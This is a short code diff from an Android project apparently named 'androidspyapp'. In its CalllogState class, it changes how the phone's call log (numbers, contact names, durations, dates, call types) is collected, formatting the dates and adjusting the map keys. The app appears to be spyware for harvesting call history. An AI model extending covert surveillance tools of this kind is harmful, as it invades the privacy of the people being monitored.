@@ -6,6 +6,8 @@ import android.database.Cursor
 import android.provider.CallLog
 import android.util.Log
 import com.komnacki.androidspyapp.Message
+import java.text.SimpleDateFormat
+import java.util.*
 
 
 public class CalllogState(override var context: Context) : Message {
@@ -33,7 +35,9 @@ public class CalllogState(override var context: Context) : Message {
                     val number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))
                     val name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME))
                     val duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION))
-                    val date = c.getString(c.getColumnIndex(CallLog.Calls.DATE))
+                    Log.d("KK: ", "c.getLong(c.getColumnIndex(CallLog.Calls.DATE): " + c.getLong(c.getColumnIndex(CallLog.Calls.DATE)))
+
+                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date(c.getLong(c.getColumnIndex(CallLog.Calls.DATE))))
                     val type = when(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)).toInt()) {
                         CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                         CallLog.Calls.INCOMING_TYPE -> "Incoming"
@@ -50,7 +54,7 @@ public class CalllogState(override var context: Context) : Message {
                         type
                     )
                     Log.d("KK: ", "log: " + log)
-                    info[log.date + "-" + log.name] = log
+                    info[log.date + " " + log.name] = log
                     index++
                 }
                 c.close()
